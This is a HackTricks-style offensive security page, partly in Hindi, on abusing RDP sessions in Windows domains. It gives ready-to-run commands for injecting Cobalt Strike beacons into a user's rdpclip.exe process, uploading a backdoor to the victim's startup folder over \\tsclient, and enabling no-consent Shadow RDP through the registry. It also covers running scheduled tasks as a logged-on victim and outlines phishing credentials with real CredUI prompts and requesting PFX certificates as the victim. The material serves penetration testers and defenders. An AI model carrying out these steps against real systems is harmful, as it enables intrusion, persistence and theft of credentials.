# RDP Sessions Abuse

{{#include ../../banners/hacktricks-training.md}}

## RDP Process Injection

यदि वर्तमान domain में किसी भी **computer** पर **external group** के पास **RDP access** है, तो एक **attacker** उस **computer** को **compromise that computer and wait for him** कर सकता है।

एक बार जब वह user RDP के माध्यम से access कर लेता है, तो **attacker can pivot to that users session** और external domain में उसकी permissions का दुरुपयोग कर सकता है।
```bash
# Supposing the group "External Users" has RDP access in the current domain
## lets find where they could access
## The easiest way would be with bloodhound, but you could also run:
Get-DomainGPOUserLocalGroupMapping -Identity "External Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
#or
Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName

# Then, compromise the listed machines, and wait til someone from the external domain logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local
## From that beacon you can just run powerview modules interacting with the external domain as that user
```
देखें **other ways to steal sessions with other tools** [**in this page.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)

## RDPInception

यदि कोई उपयोगकर्ता **RDP into a machine** के माध्यम से किसी मशीन पर पहुँचता है जहाँ एक **attacker** उसके लिए **waiting** कर रहा है, तो attacker सक्षम होगा **inject a beacon in the RDP session of the user** और यदि **victim mounted his drive** जब वह RDP के माध्यम से पहुँच रहा था, तो **attacker could access it**।

इस मामले में आप बस **compromise** कर सकते हैं **victims** **original computer** को, एक **backdoor** **statup folder** में लिखकर।
```bash
# Wait til someone logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local

# There's a UNC path called tsclient which has a mount point for every drive that is being shared over RDP.
## \\tsclient\c is the C: drive on the origin machine of the RDP session
beacon> ls \\tsclient\c

Size     Type    Last Modified         Name
----     ----    -------------         ----
dir     02/10/2021 04:11:30   $Recycle.Bin
dir     02/10/2021 03:23:44   Boot
dir     02/20/2021 10:15:23   Config.Msi
dir     10/18/2016 01:59:39   Documents and Settings
[...]

# Upload backdoor to startup folder
beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon> upload C:\Payloads\pivot.exe
```
## Shadow RDP

यदि आप उस होस्ट पर **local admin** हैं जहाँ शिकार के पास पहले से ही **active RDP session** है, तो आप **view/control that desktop without stealing the password or dumping LSASS** करने में सक्षम हो सकते हैं।

यह निर्भर करता है कि **Remote Desktop Services shadowing** policy कहाँ संग्रहीत है:
```text
HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services\Shadow
```
दिलचस्प मान:

- `0`: अक्षम
- `1`: `EnableInputNotify` (नियंत्रण, उपयोगकर्ता की स्वीकृति आवश्यक)
- `2`: `EnableInputNoNotify` (नियंत्रण, **उपयोगकर्ता की कोई स्वीकृति नहीं**)
- `3`: `EnableNoInputNotify` (केवल देखने के लिए, उपयोगकर्ता की स्वीकृति आवश्यक)
- `4`: `EnableNoInputNoNotify` (केवल देखने के लिए, **उपयोगकर्ता की कोई स्वीकृति नहीं**)
```cmd
:: Check the policy
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow

:: Enable interaction without consent
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f

:: Enumerate sessions and shadow the target one
quser /server:<HOST>
mstsc /v:<HOST> /shadow:<SESSION_ID> /control /noconsentprompt /prompt
```
यह विशेष रूप से तब उपयोगी होता है जब RDP के जरिए जुड़ा हुआ कोई उच्चाधिकार वाला उपयोगकर्ता अनलॉक्ड desktop, KeePass session, MMC console, browser session, या admin shell खुला छोड़ दे।

## लॉग-ऑन उपयोगकर्ता के रूप में Scheduled Tasks

यदि आप **local admin** हैं और लक्षित उपयोगकर्ता **वर्तमान में logged on** है, तो Task Scheduler उस उपयोगकर्ता के रूप में बिना उनके पासवर्ड के कोड शुरू कर सकता है।

यह पीड़ित के मौजूदा logon सत्र को एक execution primitive में बदल देता है:
```cmd
schtasks /create /S <HOST> /RU "<DOMAIN\\user>" /SC ONCE /ST 00:00 /TN "Updater" /TR "cmd.exe /c whoami > C:\\Windows\\Temp\\whoami.txt"
schtasks /run /S <HOST> /TN "Updater"
```
Notes:

- If the user is **not logged on**, Windows usually requires the password to create a task that runs as them.
- If the user **is logged on**, the task can reuse the existing logon context.
- This is a practical way to execute GUI actions or launch binaries inside the पीड़ित सत्र without touching LSASS.

## CredUI Prompt Abuse From the Victim Session

Once you can execute **पीड़ित के इंटरैक्टिव डेस्कटॉप के अंदर** (for example via **Shadow RDP** or **a scheduled task running as that user**), you can display a **real Windows credential prompt** using CredUI APIs and harvest credentials entered by the victim.

Relevant APIs:

- `CredUIPromptForWindowsCredentials`
- `CredUnPackAuthenticationBuffer`

Typical flow:

1. Spawn a binary in the पीड़ित सत्र.
2. Display a domain-authentication prompt that matches the current domain branding.
3. Unpack the returned auth buffer.
4. Validate the provided credentials and optionally keep prompting until valid credentials are entered.

This is useful for **on-host phishing** because the prompt is rendered by standard Windows APIs instead of a fake HTML form.

## Requesting a PFX In the Victim Context

The same **scheduled-task-as-user** primitive can be used to request a **certificate/PFX as the logged-on victim**. That certificate can later be used for **AD authentication** as that user, avoiding password theft entirely.

High-level flow:

1. Gain **local admin** on a host where the victim is logged on.
2. Run enrollment/export logic as the victim using a **scheduled task**.
3. Export the resulting **PFX**.
4. Use the PFX for PKINIT / certificate-based AD authentication.

See the AD CS pages for follow-up abuse:

{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

## संदर्भ

- [SensePost - From flat networks to locked up domains with tiering models](https://sensepost.com/blog/2026/from-flat-networks-to-locked-up-domains-with-tiering-models/)
- [Microsoft - Remote Desktop shadow](https://learn.microsoft.com/windows/win32/termserv/remote-desktop-shadow)
- [NetExec - Shadow RDP plugin PR #465](https://github.com/Pennyw0rth/NetExec/pull/465)
- [NetExec - schtask_as module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/schtask_as.py)
- [NetExec - Request PFX via scheduled task PR #908](https://github.com/Pennyw0rth/NetExec/pull/908)

{{#include ../../banners/hacktricks-training.md}}
